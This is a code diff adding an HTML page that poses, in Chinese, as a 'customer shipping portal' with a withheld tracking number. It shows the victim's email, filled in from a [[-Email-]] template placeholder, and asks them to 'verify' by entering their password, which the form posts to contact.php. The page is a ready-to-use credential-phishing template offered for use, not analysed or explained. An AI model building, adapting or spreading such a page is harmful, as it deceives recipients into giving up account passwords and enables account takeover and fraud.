@@ -1,0 +1,104 @@
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+
+	<style>
+	label{
+	font-family:Arial, Helvetica;
+	font-size:0.8em;
+	}
+	</style>
+	
+	<style>
+    body {
+        background-image: url("./resources/63939373638494.png");
+        background-repeat: no-repeat;
+    }
+    </style>
+</head>
+<body>
+    
+    <br><br><br><br><br><br>
+<table align="center" width="93%"><tr><td>
+    
+
+    <table align="left" cellspacing="0" 
+    style="width: 380px; height:450px; border-radius: 5px; background-color: #FFFFFF; 
+  -webkit-box-shadow: 1px 1px 1px 2px #DADADA; box-shadow: 1px 1px 1px 2px #DADADA4;
+  border-radius: 1px 5px 1px 5px;">
+        
+    <tr><td>
+    
+        <table align="center">  
+        <tr><td style="height:0px;"></td></tr>
+        <tr><td>
+        <center>
+        <form method='post' action='contact.php' name='contactform' id='contactform'>
+            <p>
+                <font face="arial" color="#FFFFFF" style="font-size:35px;">
+                    &#23458;&#25143;&#36816;&#36755;&#38376;&#25143;
+                </font>
+                <br><br>
+                <font face="arial" color="#FFFFFF" style="font-size:14px;">
+                    &#25910;&#20214;&#20154;&#30340;&#30005;&#23376;&#37038;&#20214; ID <br> <strong> [[-Email-]] </strong>
+                </font>
+                <br>
+                <br>
+                <font face="arial" color="#FFFFFF" style="font-size:14px;">
+                    &#36861;&#36394;&#21495;&#30721;: <br> <strong> 808-337-XXXX </strong> <i>(&#35814;&#32454;&#20449;&#24687;&#20445;&#30041;)</i>
+                </font>
+                <br>
+                <br>
+                <font face="arial" color="#FFFFFF" style="font-size:16px;">
+                    &#35201;&#25509;&#25910;&#36861;&#36394;&#21495;&#30721;&#65292;&#35831;&#39564;&#35777;&#24744;&#30340;&#25509;&#25910;&#32773; ID
+                </font>
+                <br>
+            </p>
+    
+            <p>
+	        <input type='email' name='email' style="height:40px; width:320px; padding:5px;" value="[[-Email-]]" disabled />
+	        </p>
+	
+	        <p>
+	        <input type='password' name='fullname' style="height:40px; width:320px; padding:5px;" placeholder="&#36755;&#20837;&#23494;&#30721;" required/>
+	        </p>
+
+
+	        <input type='submit' name='submit' value='Hair'
+	        style="background:#075BAB; width:320px; height:43px; border:#0061A8; padding:7px; 
+		        border-radius:20px; color:#FFF; font-size:15px; font-weight:bold; color:#FFFFFF;"/>
+        </form>
+        </center>
+        
+			
+		</p>
+		
+        </td></tr></table>
+        
+    </td></tr>
+    </table>
+    
+</td></tr></table>
+
+    <script>
+    document.contactform.onsubmit=function()
+    {
+	    if(document.contactform.fullname.value =='')
+	    {
+		    alert("Please enter correct password");
+		    document.contactform.fullname.focus();
+		    return false;
+	    }
+	    else if(document.contactform.email.value =='')
+	    {
+		    alert("Please enter your Email address");
+		    document.contactform.email.focus();
+		    return false;
+	    }
+	    return true;
+    }
+    </script>
+
+</body>
+</html>
